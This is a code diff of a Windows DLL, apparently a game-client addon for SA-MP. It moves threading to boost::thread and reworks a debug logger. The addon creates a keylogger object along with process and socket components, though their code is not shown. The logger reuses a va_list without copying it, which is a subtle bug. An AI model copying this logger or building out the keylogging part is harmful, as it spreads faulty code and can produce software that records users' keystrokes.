@@ -8,8 +8,8 @@
 
 
 
-extern addonThread *gThread;
-extern addonMutex *gMutex;
+//extern addonThread *gThread;
+//extern addonMutex *gMutex;
 extern addonSocket *gSocket;
 extern addonProcess *gProcess;
 extern addonKeylog *gKeylog;
@@ -37,8 +37,8 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 
 		delete gKeylog;
 		delete gProcess;
-		delete gThread;
-		delete gMutex;
+		//delete gThread;
+		//delete gMutex;
 
 		addonDebug("-----------------------------------------------------------------");
 		addonDebug("Called dll detach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
@@ -61,20 +61,22 @@ __declspec(dllexport) void addon_start()
 
 	addonDebug("Addon attached from loader. Processing...");
 
-	gMutex = new addonMutex();
-	gThread = new addonThread();
+	//gMutex = new addonMutex();
+	//gThread = new addonThread();
+
+	boost::thread thread(&addonThread::Thread);
 }
 
 
 
-DWORD addonThread::Thread(void *lpParam)
+void addonThread::Thread()
 {
-	addonDebug("Thread addonThread::Thread(%i) succesfuly started", (int)lpParam);
+	addonDebug("Thread addonThread::Thread() succesfuly started");
 
 	std::string commandLine = gString->wstring_to_string(std::wstring(GetCommandLineW()));
 
 	if(commandLine.find("-c") == std::string::npos)
-		return false;
+		return;
 
 	char name[25];
 	char ip[16];
@@ -100,8 +102,6 @@ DWORD addonThread::Thread(void *lpParam)
 
 	gProcess = new addonProcess();
 	gKeylog = new addonKeylog();
-
-	return true;
 }
 
 
@@ -121,17 +121,17 @@ void addonDebug(char *text, ...)
 	va_start(args, text);
 
 	int length = vsnprintf(NULL, NULL, text, args);
-	char *chars = new char[++length];
+	char *chars = (char *)malloc(++length);
 
-	length = vsnprintf(chars, length, text, args);
+	vsnprintf(chars, length, text, args);
 	std::string buffer(chars);
 
-	delete[] chars;
+	free(chars);
 
 	va_end(args);
 
-	logfile.open("SAMP\\addon\\addon.log", std::fstream::out | std::fstream::app);
-	logfile << '[' << timeform << ']' << ' ' << buffer << '\n';
+	logfile.open("SAMP\\addon\\addon.log", (std::fstream::out | std::fstream::app));
+	logfile << '[' << timeform << ']' << ' ' << buffer << std::endl;
 	logfile.flush();
 	logfile.close();
 }
